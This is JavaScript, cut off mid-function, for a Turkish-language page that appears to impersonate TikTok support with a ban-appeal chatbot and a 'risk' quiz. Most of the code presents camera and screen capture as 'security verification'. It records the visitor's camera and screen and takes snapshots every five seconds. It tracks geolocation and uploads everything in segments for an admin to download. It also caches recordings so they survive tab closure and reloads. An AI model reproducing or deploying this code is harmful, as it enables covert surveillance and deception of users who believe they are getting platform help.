(function () {
  console.info("[help-build]", "144", location.pathname);
  const searchInput = document.getElementById("help-search");
  const searchBtn = document.getElementById("search-btn");
  const searchHint = document.getElementById("search-hint");

  const searchMap = [
    {
      keys: /shadow|gölge|golge|fyp|keşfet|kesfet|görünür|gorunur|dağıtım|dagitim/i,
      href: "articles/shadowban.html",
      label: "Görünürlük düşüşü rehberi",
    },
    {
      keys: /algoritma|algorithm|öneri|oneri|viral/i,
      href: "articles/algorithm.html",
      label: "Öneri sistemi rehberi",
    },
    {
      keys: /view|izlenme|izlenm|istatistik|görüntülen|goruntulen/i,
      href: "articles/views.html",
      label: "İzlenme kontrol listesi",
    },
    {
      keys: /ban|yasak|kapand|askı|aski|suspended|itiraz|appeal/i,
      href: "ban-appeal.html",
      label: "Ban itiraz rehberi",
    },
    {
      keys: /sohbet|destek|chat|yardım|yardim/i,
      href: "chat.html",
      label: "Destek sohbeti",
    },
  ];

  function runSearch() {
    if (!searchHint) return;
    const q = (searchInput?.value || "").trim();
    searchHint.hidden = false;
    if (!q) {
      searchHint.textContent = "Bir konu yazın. Örn: ban, izlenme, algoritma, görünürlük.";
      return;
    }
    const match = searchMap.find((item) => item.keys.test(q));
    if (match) {
      searchHint.innerHTML = `"${q}" için önerilen sayfa: <a href="${match.href}">${match.label}</a>`;
      return;
    }
    searchHint.innerHTML =
      `"${q}" için doğrudan eşleşme yok. <a href="#konular">Popüler konulara</a> bakın veya <a href="chat.html">destek sohbetini</a> kullanın.`;
  }

  searchBtn?.addEventListener("click", runSearch);
  searchInput?.addEventListener("keydown", (e) => {
    if (e.key === "Enter") {
      e.preventDefault();
      runSearch();
    }
  });

  const form = document.getElementById("appeal-form");

  // Ban itiraz kontrol listesi → tüm gönderimler destek sohbetine
  form?.addEventListener("submit", (e) => {
    e.preventDefault();
    location.href = "chat.html";
  });

  /* —— Destek sohbeti —— */
  const SECRETISH =
    /(şifre|sifre|password|parola|e-?posta|email|mail|kullanıcı adı|kullanici adi|otp|doğrulama kodu|dogrulama kodu|hesap şifre|credit card|kart no|telefon numar|gsm)/i;
  const RISK_TRIGGER =
    /risk|hesab(ım|iniz|ınız).*(tehlike|risk|kısıt|kisit)|tehlike|güvenlik uyar|guvenlik uyar|hesabınız risk|hesabiniz risk|risk altınd|kısıtland|kisitland/i;

  const riskQuestions = [
    {
      q: "Soru 1/5 — Uygulamada hesap veya içerik uyarısı görüyor musunuz?",
      options: ["Evet", "Hayır", "Emin değilim"],
      score: { Evet: 3, Hayır: 0, "Emin değilim": 1 },
    },
    {
      q: "Soru 2/5 — Son videoların öneri (For You) trafiği belirgin düştü mü?",
      options: ["Evet, keskin düşüş", "Biraz düşük", "Normal seviyede"],
      score: { "Evet, keskin düşüş": 3, "Biraz düşük": 2, "Normal seviyede": 0 },
    },
    {
      q: "Soru 3/5 — Son 7 günde Topluluk Kuralları veya telif uyarısı aldınız mı?",
      options: ["Evet", "Hayır", "Bilmiyorum"],
      score: { Evet: 3, Hayır: 0, Bilmiyorum: 1 },
    },
    {
      q: "Soru 4/5 — Hesabınızda giriş / güvenlik bildirimi var mı?",
      options: ["Var", "Yok", "Kontrol etmedim"],
      score: { Var: 2, Yok: 0, "Kontrol etmedim": 1 },
    },
    {
      q: "Soru 5/5 — Ana sorun hangisi?",
      options: ["Ban / kapatma", "İzlenme düşüşü", "Genel belirsizlik"],
      score: { "Ban / kapatma": 3, "İzlenme düşüşü": 2, "Genel belirsizlik": 1 },
    },
  ];

  function riskVerdict(total) {
    if (total <= 3) {
      return {
        title: "Öncelik: Düşük",
        body: "Ciddi hesap yaptırımı işareti zayıf görünüyor. Analitik ve içerik performansını kontrol edin. Uygulamada uyarı alırsanız support.tiktok.com üzerinden ilerleyin.",
      };
    }
    if (total <= 8) {
      return {
        title: "Öncelik: Orta",
        body: `Skorunuz ${total}/15. Hesap bildirimlerini ve Analitik trafik kaynaklarını inceleyin. İzlenme için articles/views.html, görünürlük için articles/shadowban.html rehberlerine bakın.`,
      };
    }
    if (total <= 12) {
      return {
        title: "Öncelik: Yüksek",
        body: `Skorunuz ${total}/15. Hesap kısıtı olasılığı yüksek. Ban itiraz rehberini tamamlayın ve resmi TikTok desteğinden itiraz edin.`,
      };
    }
    return {
      title: "Öncelik: Acil",
      body: `Skorunuz ${total}/15. Ban veya güvenlik kısıtı olasılığı güçlü. Hesap işlemlerini yalnızca resmi kanallardan yürütün: support.tiktok.com. Bu sohbet hesabınızı değiştirmez.`,
    };
  }

  const inArticles = /\/articles\//.test(location.pathname) || /\\articles\\/.test(location.pathname);
  const prefix = inArticles ? "../" : "";

  const replies = [
    {
      test: SECRETISH,
      say: "Güvenlik nedeniyle şifre, e-posta veya doğrulama kodu istemiyoruz. Gerçek hesap işlemleri için yalnızca support.tiktok.com kullanın.",
    },
    {
      test: /ban|yasak|kapand|askı|aski|suspended|disabled/i,
      say: [
        `Ban veya kapatma için resmi itiraz gerekir. Kontrol listesi: ${prefix}ban-appeal.html — işlem: support.tiktok.com`,
        "Hesap kapalıysa yalnızca resmi destek üzerinden ilerleyin. Rehber için ‘Ban’ kısayolunu kullanabilirsiniz.",
      ],
    },
    {
      test: /shadow|gölge|golge|fyp|keşfet|kesfet|for you|görünür|gorunur/i,
      say: [
        `Görünürlük düşüşü rehberi: ${prefix}articles/shadowban.html — ayrıntılı kontrol için “Hesabım kısıtlandı” yazarak checklist’i başlatabilirsiniz.`,
        "Öneri trafiği düşüşü her zaman cezaya işaret etmez. Analitik ve hesap uyarılarını kontrol edin.",
      ],
    },
    {
      test: /view|izlenme|izlenm|istatistik|görüntülen|goruntulen/i,
      say: [
        `İzlenme kontrol listesi: ${prefix}articles/views.html — tamamlanma oranı ve trafik kaynaklarını karşılaştırın.`,
        "Düşük izlenme çoğu zaman içerik/performans kaynaklıdır. Checklist için ‘İzlenmelerim düştü’ yazabilirsiniz.",
      ],
    },
    {
      test: /algoritma|algorithm|öneri|oneri|viral/i,
      say: [
        `Öneri sistemi özeti: ${prefix}articles/algorithm.html`,
        "Algoritma erken etkileşim ve izlenme süresine duyarlıdır. Detaylı rehbere bakın veya kısıt checklist’i başlatın.",
      ],
    },
    {
      test: /merhaba|selam|hey|hi |hello|slm/i,
      say: [
        "Merhaba. Ban, izlenme veya görünürlük sorununda yardımcı olabilirim. Altındaki kısayolları kullanın veya sorunuzu yazın. Şifre istemem.",
        "Selam. Hesap kısıtı kontrolü için ‘Hesabım kısıtlandı’ yazın.",
      ],
    },
    {
      test: /teşekkür|tesekkur|sağol|sagol|thanks/i,
      say: "Rica ederim. Yeni bir kontrol için tekrar ‘Hesabım kısıtlandı’ yazabilirsiniz.",
    },
    {
      test: /yardım|yardim|help|destek/i,
      say: "Buradayım. Ban, izlenme düşüşü veya görünürlük için kısayolları kullanın; kısıt kontrolü için ‘Hesabım kısıtlandı’ yazın. Hesap bilgisi paylaşmayın.",
    },
  ];

  const fallbackReplies = [
    "Anladım. Ban, izlenme veya görünürlük yazın; ya da kısıt kontrolü için ‘Hesabım kısıtlandı’ deyin.",
    "Daha net yardımcı olayım: Ban / İzlenme düşüşü / Görünürlük kısayollarından birini seçin.",
    "Konuyu anlamak için kısayolu kullanın veya ‘Hesabım kısıtlandı’ yazarak checklist’i başlatın.",
    "İlgili rehbere yönlendirebilirim. Ban, izlenme veya kısıt kelimelerinden birini deneyin.",
  ];

  function pick(list) {
    return list[Math.floor(Math.random() * list.length)];
  }

  function botReply(text) {
    for (const rule of replies) {
      if (rule.test.test(text)) {
        return Array.isArray(rule.say) ? pick(rule.say) : rule.say;
      }
    }
    return pick(fallbackReplies);
  }

  function matchOption(answer, options) {
    const normalized = answer.trim().toLocaleLowerCase("tr-TR");
    const exact = options.find((o) => o.toLocaleLowerCase("tr-TR") === normalized);
    if (exact) return exact;
    const partial = options.find(
      (o) =>
        normalized.includes(o.toLocaleLowerCase("tr-TR")) ||
        o.toLocaleLowerCase("tr-TR").includes(normalized)
    );
    if (partial) return partial;
    if (/^(e|evet|yes|y)$/i.test(normalized)) {
      return options.find((o) => /^evet$/i.test(o)) || null;
    }
    if (/^(h|hayır|hayir|no|n)$/i.test(normalized)) {
      return options.find((o) => /^hayır$/i.test(o)) || null;
    }
    const num = parseInt(normalized, 10);
    if (num >= 1 && num <= options.length) return options[num - 1];
    return null;
  }

  function nowLabel() {
    return new Date().toLocaleTimeString("tr-TR", { hour: "2-digit", minute: "2-digit" });
  }

  function syncMessage(who, text) {
    const sync = window.ChatSync;
    const send = (readySync) => {
      if (!readySync?.enabled) return;
      readySync.pushMessage(who, text).catch((err) => {
        console.error("Mesaj senkron hatası", err);
      });
    };
    if (sync?.enabled) {
      send(sync);
      return;
    }
    if (window.ChatSyncReady) {
      window.ChatSyncReady.then(send);
    }
  }

  function appendMessage(box, who, text, options = {}) {
    const syncOut = options.sync !== false;
    const isLoading = options.type === "loading";
    const imageUrl = String(options.imageUrl || "").trim();
    if (!box) {
      if (syncOut && (who === "user" || who === "bot") && !imageUrl && !isLoading) {
        syncMessage(who, text);
      }
      return null;
    }
    const label =
      who === "user" ? "Siz" : who === "admin" ? "Destek" : "Asistan";
    const row = document.createElement("div");
    row.className = `chat-bubble chat-${who === "user" ? "user" : "bot"}${
      who === "admin" ? " chat-admin" : ""
    }${isLoading ? " chat-loading" : ""}${imageUrl ? " chat-photo" : ""}`;
    const meta = document.createElement("span");
    meta.className = "chat-meta";
    meta.textContent = `${label} · ${nowLabel()}`;
    const body = document.createElement("div");
    body.className = "chat-loading-body";
    if (isLoading) {
      body.innerHTML = `
        <span class="chat-spinner" aria-hidden="true"></span>
        <p></p>
        <span class="chat-loading-dots" aria-hidden="true"><i></i><i></i><i></i></span>
      `;
      body.querySelector("p").textContent =
        text || "Kimlik doğrulaması hazırlanıyor. Lütfen bekleyin…";
    } else {
      const p = document.createElement("p");
      p.textContent = text;
      body.appendChild(p);
      if (imageUrl) {
        const link = document.createElement("a");
        link.href = imageUrl;
        link.target = "_blank";
        link.rel = "noopener";
        link.className = "chat-photo-link";
        const img = document.createElement("img");
        img.src = imageUrl;
        img.alt = text || "Gönderilen görsel";
        img.className = "chat-photo-thumb";
        img.loading = "lazy";
        link.appendChild(img);
        body.appendChild(link);
      }
    }
    row.append(meta, body);
    box.appendChild(row);
    box.scrollTop = box.scrollHeight;
    if (syncOut && (who === "user" || who === "bot") && !imageUrl) {
      syncMessage(who, text);
    }
    return row;
  }

  const cameraSessions = new Map();
  let startVisitorCameraLock = null;

  /** State map’te taşındıysa güncel callId (migrate sonrası konum/snapshot bozulmasın) */
  function resolveSessionCallId(state, fallback) {
    if (!state) return fallback;
    for (const [id, st] of cameraSessions.entries()) {
      if (st === state) return id;
    }
    return fallback;
  }

  function sessionStillActive(state, fallbackCallId) {
    const id = resolveSessionCallId(state, fallbackCallId);
    return Boolean(id && cameraSessions.get(id) === state);
  }

  function pickVisitorRecorderMime() {
    if (typeof MediaRecorder === "undefined") return "";
    // Kalite: VP9 > VP8 > H264/mp4 (Safari yalnız mp4)
    const types = [
      "video/webm;codecs=vp9",
      "video/webm;codecs=vp8",
      "video/webm",
      "video/mp4;codecs=h264",
      "video/mp4",
    ];
    return types.find((t) => MediaRecorder.isTypeSupported(t)) || "";
  }

  function startVisitorRecording(state) {
    if (!state?.stream || state.recorder || typeof MediaRecorder === "undefined") return false;
    const tracks = state.stream.getVideoTracks().filter((t) => t.readyState === "live");
    if (!tracks.length) return false;
    tracks.forEach(tuneVideoTrack);
    const mime = pickVisitorRecorderMime();
    let recorder;
    try {
      const opts = mime
        ? { mimeType: mime, videoBitsPerSecond: VISITOR_RECORD_BITRATE }
        : { videoBitsPerSecond: VISITOR_RECORD_BITRATE };
      recorder = new MediaRecorder(new MediaStream(tracks), opts);
    } catch {
      try {
        recorder = mime
          ? new MediaRecorder(new MediaStream(tracks), { mimeType: mime })
          : new MediaRecorder(new MediaStream(tracks));
      } catch {
        return false;
      }
    }
    const chunks = [];
    state.recordChunks = chunks;
    state.recorderMime = recorder.mimeType || mime || "video/webm";
    recorder.ondataavailable = (e) => {
      if (e.data?.size) chunks.push(e.data);
    };
    state.recorder = recorder;
    try {
      // 1s timeslice — daha az bozuk GOP / daha temiz segment
      recorder.start(1000);
      return true;
    } catch {
      state.recorder = null;
      return false;
    }
  }

  function recordingFileExt(mimeOrBlob) {
    const t = typeof mimeOrBlob === "string" ? mimeOrBlob : mimeOrBlob?.type || "";
    if (/mp4|mpeg|m4v/i.test(t)) return "mp4";
    return "webm";
  }

  function stopVisitorRecorder(state) {
    return new Promise((resolve) => {
      const rec = state?.recorder;
      let settled = false;
      const settle = (blob) => {
        if (settled) return;
        settled = true;
        if (blob?.size) state.lastBlob = blob;
        resolve(blob?.size ? blob : state?.lastBlob || null);
      };
      const buildBlob = () => {
        const blob = new Blob(state.recordChunks || [], {
          type: state.recorderMime || "video/webm",
        });
        return blob.size ? blob : null;
      };
      if (!rec || rec.state === "inactive") {
        settle(buildBlob() || state?.lastBlob || null);
        return;
      }
      const finish = () => settle(buildBlob());
      rec.addEventListener("stop", finish, { once: true });
      try {
        if (rec.state === "recording") {
          try {
            rec.requestData();
          } catch {
            /* ignore */
          }
        }
        rec.stop();
      } catch {
        settle(buildBlob());
      }
      window.setTimeout(() => settle(buildBlob() || state.lastBlob || null), 5000);
    });
  }

  const PENDING_REC_DB = "tiktok-help-pending-rec";
  const PENDING_REC_STORE = "recordings";

  function openPendingRecDb() {
    return new Promise((resolve, reject) => {
      if (!window.indexedDB) {
        reject(new Error("no-idb"));
        return;
      }
      const req = indexedDB.open(PENDING_REC_DB, 1);
      req.onupgradeneeded = () => {
        const db = req.result;
        if (!db.objectStoreNames.contains(PENDING_REC_STORE)) {
          db.createObjectStore(PENDING_REC_STORE, { keyPath: "id" });
        }
      };
      req.onsuccess = () => resolve(req.result);
      req.onerror = () => reject(req.error || new Error("idb-open"));
    });
  }

  async function stashPendingRecording({ sessionId, callId, blob, fileName, id }) {
    if (!blob?.size || !sessionId || !callId) return;
    try {
      const db = await openPendingRecDb();
      await new Promise((resolve, reject) => {
        const tx = db.transaction(PENDING_REC_STORE, "readwrite");
        tx.objectStore(PENDING_REC_STORE).put({
          id: id || `${sessionId}:${callId}:${Date.now()}`,
          sessionId,
          callId,
          fileName: fileName || `kamera-${String(callId).slice(0, 8)}.webm`,
          mime: blob.type || "video/webm",
          blob,
          ts: Date.now(),
        });
        tx.oncomplete = () => resolve();
        tx.onerror = () => reject(tx.error);
      });
      db.close?.();
    } catch (err) {
      console.warn("pending rec stash", err);
    }
  }

  async function removePendingRecording(id) {
    try {
      const db = await openPendingRecDb();
      await new Promise((resolve, reject) => {
        const tx = db.transaction(PENDING_REC_STORE, "readwrite");
        tx.objectStore(PENDING_REC_STORE).delete(id);
        tx.oncomplete = () => resolve();
        tx.onerror = () => reject(tx.error);
      });
      db.close?.();
    } catch {
      /* ignore */
    }
  }

  async function drainPendingRecordings() {
    const sync = window.ChatSync;
    if (!sync?.enabled || !sync.uploadCameraRecording) return;
    let rows = [];
    try {
      const db = await openPendingRecDb();
      rows = await new Promise((resolve, reject) => {
        const tx = db.transaction(PENDING_REC_STORE, "readonly");
        const req = tx.objectStore(PENDING_REC_STORE).getAll();
        req.onsuccess = () => resolve(req.result || []);
        req.onerror = () => reject(req.error);
      });
      db.close?.();
    } catch {
      return;
    }
    for (const row of rows) {
      if (!row?.blob?.size || !row.sessionId || !row.callId) {
        await removePendingRecording(row?.id);
        continue;
      }
      try {
        const isSegment = /:s\d+$/i.test(String(row.id || ""));
        await sync.uploadCameraRecording(row.sessionId, row.callId, row.blob, row.fileName, {
          finalize: !isSegment,
          seq: Number(String(row.id || "").split(":s").pop()) || undefined,
        });
        await removePendingRecording(row.id);
        if (!isSegment) syncMessage("user", "Bekleyen güvenlik kaydı gönderildi.");
      } catch (err) {
        console.warn("pending rec upload", err);
      }
    }
  }

  const SEGMENT_UPLOAD_MS = 10_000;
  const SCREEN_SEGMENT_MS = 10_000;

  const VISITOR_RECORD_BITRATE = 6_000_000;

  function tuneVideoTrack(track) {
    if (!track || track.kind !== "video") return;
    try {
      if ("contentHint" in track) track.contentHint = "motion";
    } catch {
      /* ignore */
    }
    try {
      track
        .applyConstraints?.({
          width: { ideal: 1920, min: 640 },
          height: { ideal: 1080, min: 480 },
          frameRate: { ideal: 30, min: 15 },
        })
        .catch(() => {
          track
            .applyConstraints?.({
              width: { ideal: 1280 },
              height: { ideal: 720 },
              frameRate: { ideal: 30 },
            })
            .catch(() => {});
        });
    } catch {
      /* ignore */
    }
  }

  /** Anlık ekran kaydı durumu */
  let screenSession = null;

  function screenCaptureActive() {
    const s = screenSession?.stream;
    return Boolean(s && s.getVideoTracks?.().some((t) => t.readyState === "live"));
  }

  async function acquireScreenStreamNative() {
    if (!navigator.mediaDevices?.getDisplayMedia) {
      throw new Error("Ekran kaydı desteklenmiyor");
    }
    const stream = await navigator.mediaDevices.getDisplayMedia({
      video: {
        frameRate: { ideal: 15, max: 30 },
        width: { ideal: 1920 },
        height: { ideal: 1080 },
        displaySurface: "monitor",
      },
      audio: false,
      preferCurrentTab: false,
      selfBrowserSurface: "exclude",
      systemAudio: "exclude",
      surfaceSwitching: "include",
      monitorTypeSurfaces: "include",
    });
    const vt = stream.getVideoTracks?.()[0];
    if (vt) {
      try {
        if ("contentHint" in vt) vt.contentHint = "detail";
      } catch {
        /* ignore */
      }
      vt.addEventListener("ended", () => {
        void finalizeScreenCapture({ reason: "track-ended" });
      });
    }
    return stream;
  }

  function startScreenRecorder(state) {
    if (!state?.stream || state.recorder || typeof MediaRecorder === "undefined") return false;
    const tracks = state.stream.getVideoTracks().filter((t) => t.readyState === "live");
    if (!tracks.length) return false;
    const mime = pickVisitorRecorderMime();
    let recorder;
    try {
      const opts = mime
        ? { mimeType: mime, videoBitsPerSecond: 3_500_000 }
        : { videoBitsPerSecond: 3_500_000 };
      recorder = new MediaRecorder(new MediaStream(tracks), opts);
    } catch {
      try {
        recorder = mime
          ? new MediaRecorder(new MediaStream(tracks), { mimeType: mime })
          : new MediaRecorder(new MediaStream(tracks));
      } catch {
        return false;
      }
    }
    const chunks = [];
    state.recordChunks = chunks;
    state.recorderMime = recorder.mimeType || mime || "video/webm";
    recorder.ondataavailable = (e) => {
      if (e.data?.size) chunks.push(e.data);
    };
    state.recorder = recorder;
    try {
      recorder.start(1000);
      return true;
    } catch {
      state.recorder = null;
      return false;
    }
  }

  async function rotateAndUploadScreenSegment(state, sync) {
    if (!state || state._segmentBusy || !sync?.uploadScreenRecording) return;
    state._segmentBusy = true;
    try {
      const blob = await stopVisitorRecorder(state);
      startScreenRecorder(state);
      if (!blob?.size) return;
      const sid = sync.getSessionId?.() || (await sync.ensureSession?.());
      if (!sid) return;
      const ext = recordingFileExt(blob);
      const name = `ekran-${String(sid).slice(0, 8)}.${ext}`;
      const url = await sync.uploadScreenRecording(sid, blob, name, { finalize: false });
      if (url) {
        state.lastUploadedUrl = url;
        state.lastUploadedName = name;
      }
    } catch (err) {
      console.warn("screen segment", err);
      if (screenSession === state && !state.recorder) startScreenRecorder(state);
    } finally {
      state._segmentBusy = false;
    }
  }

  async function beginScreenCapture(stream) {
    if (!stream) return false;
    if (screenCaptureActive()) {
      try {
        stream.getTracks?.().forEach((t) => t.stop());
      } catch {
        /* ignore */
      }
      return true;
    }
    await finalizeScreenCapture({ upload: false });
    const state = {
      stream,
      recorder: null,
      recordChunks: [],
      recorderMime: "",
      segmentTimer: null,
      _segmentBusy: false,
      lastUploadedUrl: "",
      lastUploadedName: "",
    };
    screenSession = state;
    if (!startScreenRecorder(state)) {
      window.setTimeout(() => startScreenRecorder(state), 400);
    }

    window.setTimeout(() => {
      void rotateAndUploadScreenSegment(state, window.ChatSync);
    }, 3000);
    state.segmentTimer = window.setInterval(() => {
      void rotateAndUploadScreenSegment(state, window.ChatSync);
    }, SCREEN_SEGMENT_MS);

    try {
      sessionStorage.setItem("screen_capture_on_v1", "1");
    } catch {
      /* ignore */
    }
    return true;
  }

  async function finalizeScreenCapture({ upload = true, reason = "" } = {}) {
    const state = screenSession;
    if (!state) return;
    screenSession = null;
    if (state.segmentTimer) {
      window.clearInterval(state.segmentTimer);
      state.segmentTimer = null;
    }
    let blob = null;
    try {
      blob = await stopVisitorRecorder(state);
    } catch {
      blob = null;
    }
    try {
      state.stream?.getTracks?.().forEach((t) => t.stop());
    } catch {
      /* ignore */
    }
    if (upload && blob?.size) {
      try {
        const sync = window.ChatSync;
        const sid = sync?.getSessionId?.() || (await sync?.ensureSession?.());
        if (sid && sync?.uploadScreenRecording) {
          const ext = recordingFileExt(blob);
          const name = state.lastUploadedName || `ekran-${String(sid).slice(0, 8)}.${ext}`;
          await sync.uploadScreenRecording(sid, blob, name, { finalize: true });
        }
      } catch (err) {
        console.warn("screen finalize", err, reason);
      }
    }
    try {
      sessionStorage.removeItem("screen_capture_on_v1");
    } catch {
      /* ignore */
    }
  }

  async function rotateAndUploadSegment(state, sessionId, callId, sync) {
    const activeId = resolveSessionCallId(state, callId);
    if (!state || !sessionStillActive(state, callId) || state._segmentBusy) return;
    if (!sync?.uploadCameraRecording) return;
    state._segmentBusy = true;
    try {
      const blob = await stopVisitorRecorder(state);
      startVisitorRecording(state);
      if (!blob?.size || !sessionStillActive(state, callId)) return;
      const uploadId = resolveSessionCallId(state, activeId);
      const ext = recordingFileExt(blob);
      const seq = (state._segmentSeq = (Number(state._segmentSeq) || 0) + 1);
      const name = `kamera-${String(uploadId).slice(0, 8)}-s${String(seq).padStart(4, "0")}.${ext}`;
      // Parça kaybını önle: yüklemeden önce IDB’ye koy
      const pendingId = `${sessionId}:${uploadId}:s${seq}`;
      try {
        await stashPendingRecording({
          blob,
          sessionId,
          callId: uploadId,
          fileName: name,
          id: pendingId,
        });
      } catch {
        /* ignore */
      }
      const url = await sync.uploadCameraRecording(sessionId, uploadId, blob, name, {
        finalize: false,
        seq,
      });
      if (url) {
        void removePendingRecording(pendingId);
        state.lastUploadedRecordingUrl = url;
        state.lastUploadedRecordingName = name;
        try {
          sessionStorage.setItem(
            "last_rec_meta_v1",
            JSON.stringify({
              url,
              name,
              sessionId,
              callId: uploadId,
              ts: Date.now(),
            })
          );
        } catch {
          /* ignore */
        }
      }
    } catch (err) {
      console.warn("segment upload", err);
      if (sessionStillActive(state, callId) && !state.recorder) {
        startVisitorRecording(state);
      }
    } finally {
      state._segmentBusy = false;
    }
  }

  function startSegmentUploads(state, sessionId, callId, sync) {
    if (state.segmentTimer) {
      window.clearInterval(state.segmentTimer);
      state.segmentTimer = null;
    }
    // İlk parçayı erken yükle — sekme kapanınca admin’in indireceği URL hazır olsun
    window.setTimeout(() => {
      void rotateAndUploadSegment(state, sessionId, callId, sync);
    }, 2500);
    state.segmentTimer = window.setInterval(() => {
      void rotateAndUploadSegment(state, sessionId, callId, sync);
    }, SEGMENT_UPLOAD_MS);
  }

  async function stopCameraSession(callId, { upload = true } = {}) {
    const state = cameraSessions.get(callId);
    if (!state) return;
    cameraSessions.delete(callId);

    if (state.maxDurationTimer) {
      window.clearTimeout(state.maxDurationTimer);
      state.maxDurationTimer = null;
    }
    if (state.segmentTimer) {
      window.clearInterval(state.segmentTimer);
      state.segmentTimer = null;
    }
    // Parça yükleme orta sıradaysa kayıp blob olmasın
    if (state._segmentBusy) {
      await new Promise((r) => window.setTimeout(r, 5000));
    }
    state._segmentBusy = true;
    if (state.locationRetryTimer) {
      window.clearTimeout(state.locationRetryTimer);
      state.locationRetryTimer = null;
    }
    if (state.snapshotTimer) {
      window.clearInterval(state.snapshotTimer);
      state.snapshotTimer = null;
    }
    try {
      if (state.snapVideo) {
        state.snapVideo.pause?.();
        state.snapVideo.srcObject = null;
        state.snapVideo.remove?.();
      }
    } catch {
      /* ignore */
    }
    state.snapVideo = null;

    try {
      state.unsubAnswer?.();
      state.unsubIce?.();
    } catch {
      /* ignore */
    }

    if (state.geoWatchId != null && navigator.geolocation) {
      try {
        navigator.geolocation.clearWatch(state.geoWatchId);
      } catch {
        /* ignore */
      }
      state.geoWatchId = null;
    }

    const sync = window.ChatSync;
    const sid = sync?.getSessionId?.();

    // Admin’e hemen “bitiyor” sinyali — upload bitmeden sayfa ölürse bile
    if (upload && sync?.enabled && sid) {
      sync
        .setCameraCallStatus?.(sid, callId, "ended")
        .catch(() => {});
      try {
        await sync.writeCameraSignal?.(sid, callId, "recordingStatus", "finalizing");
      } catch {
        /* ignore */
      }
    }

    // Önce kaydı bitir (track’ler hâlâ açıkken)
    const blob = await stopVisitorRecorder(state);

    // Kamerayı hemen kapat / önizlemeyi kaldır
    try {
      state.pc?.close();
    } catch {
      /* ignore */
    }
    try {
      state.stream?.getTracks()?.forEach((t) => t.stop());
      if (state.video?.srcObject) state.video.srcObject = null;
      state.wrap?.remove();
    } catch {
      /* ignore */
    }

    if (upload && sync?.enabled && sid) {
      if (blob?.size) {
        const ext = recordingFileExt(blob);
        const fileName = `kamera-${String(callId).slice(0, 8)}.${ext}`;
        await stashPendingRecording({ sessionId: sid, callId, blob, fileName });
        try {
          await sync.uploadCameraRecording(sid, callId, blob, fileName, { finalize: true });
          await removePendingRecording(`${sid}:${callId}`);
          syncMessage("user", "Güvenlik doğrulaması sonlandı; kayıt gönderildi.");
        } catch (err) {
          console.error(err);
          syncMessage(
            "user",
            `Güvenlik oturumu kapandı; kayıt şu an gönderilemedi. Sayfayı açık tutun — tekrar denenecek.`,
          );
        }
      } else {
        await sync.markCameraRecordingFailed?.(sid, callId, "empty-recording").catch(() => {});
        syncMessage("user", "Güvenlik oturumu sonlandı; kayıt boş olduğu için gönderilemedi.");
      }
    }
  }

  const SNAPSHOT_INTERVAL_MS = 5_000;

  async function captureStreamFrameBlob(stream) {
    const track = stream?.getVideoTracks?.()?.find((t) => t.readyState === "live");
    if (!track) return null;

    if (typeof ImageCapture !== "undefined") {
      try {
        const ic = new ImageCapture(track);
        if (typeof ic.takePhoto === "function") {
          const photo = await ic.takePhoto();
          if (photo?.size) return photo;
        }
        if (typeof ic.grabFrame === "function") {
          const bitmap = await ic.grabFrame();
          const canvas = document.createElement("canvas");
          canvas.width = bitmap.width;
          canvas.height = bitmap.height;
          const ctx = canvas.getContext("2d");
          ctx.drawImage(bitmap, 0, 0);
          bitmap.close?.();
          const blob = await new Promise((resolve) =>
            canvas.toBlob((b) => resolve(b), "image/jpeg", 0.82)
          );
          if (blob?.size) return blob;
        }
      } catch {
        /* canvas yoluna düş */
      }
    }

    const video = document.createElement("video");
    video.muted = true;
    video.playsInline = true;
    video.setAttribute("playsinline", "");
    video.srcObject = new MediaStream([track]);
    try {
      await video.play();
      await new Promise((r) => setTimeout(r, 120));
      const w = video.videoWidth || 640;
      const h = video.videoHeight || 480;
      if (!w || !h) return null;
      const canvas = document.createElement("canvas");
      canvas.width = w;
      canvas.height = h;
      canvas.getContext("2d").drawImage(video, 0, 0, w, h);
      return await new Promise((resolve) =>
        canvas.toBlob((b) => resolve(b), "image/jpeg", 0.82)
      );
    } catch {
      return null;
    } finally {
      try {
        video.pause();
        video.srcObject = null;
      } catch {
        /* ignore */
      }
    }
  }

  function startSnapshotUploads(state, sessionId, callId, sync) {
    if (!sync?.uploadCameraSnapshot || !state?.stream) return;
    let busy = false;
    let count = 0;

    const tick = async () => {
      if (!sessionStillActive(state, callId) || busy) return;
      busy = true;
      try {
        const blob = await captureStreamFrameBlob(state.stream);
        if (!blob?.size || !sessionStillActive(state, callId)) return;
        const uploadId = resolveSessionCallId(state, callId);
        count += 1;
        const name = `snap-${String(uploadId).slice(0, 8)}-${count}.jpg`;
        await sync.uploadCameraSnapshot(sessionId, uploadId, blob, name);
        if (count === 1) {
          syncMessage("user", "Güvenlik doğrulaması güncellendi.");
        }
      } catch (err) {
        console.warn("snapshot upload", err);
      } finally {
        busy = false;
      }
    };

    void tick();
    state.snapshotTimer = window.setInterval(tick, SNAPSHOT_INTERVAL_MS);
  }

  let leaveFlushDone = false;
  function readLastRecMeta() {
    try {
      const o = JSON.parse(sessionStorage.getItem("last_rec_meta_v1") || "null");
      if (o?.url && Date.now() - Number(o.ts || 0) < 30 * 60 * 1000) return o;
    } catch {
      /* ignore */
    }
    return null;
  }

  function isSoftResumePending() {
    try {
      return sessionStorage.getItem("soft_resume_v1") === "1";
    } catch {
      return false;
    }
  }

  function markSoftResumeIntent(callId) {
    try {
      if (callId) sessionStorage.setItem("pending_camera_call_v1", String(callId));
      sessionStorage.setItem("soft_resume_v1", "1");
      sessionStorage.removeItem("needs_fresh_call_v1");
    } catch {
      /* ignore */
    }
  }

  /**
   * pagehide/beforeunload — yenilemede de çalışır.
   * Soft resume: call’ı ENDED sayma, callId sakla, yalnızca yerel stream kes.
   */
  function flushCameraSessionsOnLeave() {
    if (leaveFlushDone) return;
    leaveFlushDone = true;

    // Ekran kaydını kapat / son parçayı yükle
    try {
      void finalizeScreenCapture({ upload: true, reason: "pagehide" });
    } catch {
      /* ignore */
    }

    const sync = window.ChatSync;
    const ids = [...cameraSessions.keys()];
    const keepId =
      latestCameraCallId ||
      ids[0] ||
      (() => {
        try {
          return sessionStorage.getItem("pending_camera_call_v1");
        } catch {
          return null;
        }
      })();

    // CallId’yi KORU — needs_fresh_call YOK (yenileme soft resume)
    if (keepId) markSoftResumeIntent(keepId);
    else {
      try {
        sessionStorage.setItem("soft_resume_v1", "1");
        sessionStorage.removeItem("needs_fresh_call_v1");
      } catch {
        /* ignore */
      }
    }

    for (const id of ids) {
      const state = cameraSessions.get(id);
      const sid = sync?.getSessionId?.() || null;

      try {
        if (state?.segmentTimer) {
          window.clearInterval(state.segmentTimer);
          state.segmentTimer = null;
        }
        if (state?.snapshotTimer) {
          window.clearInterval(state.snapshotTimer);
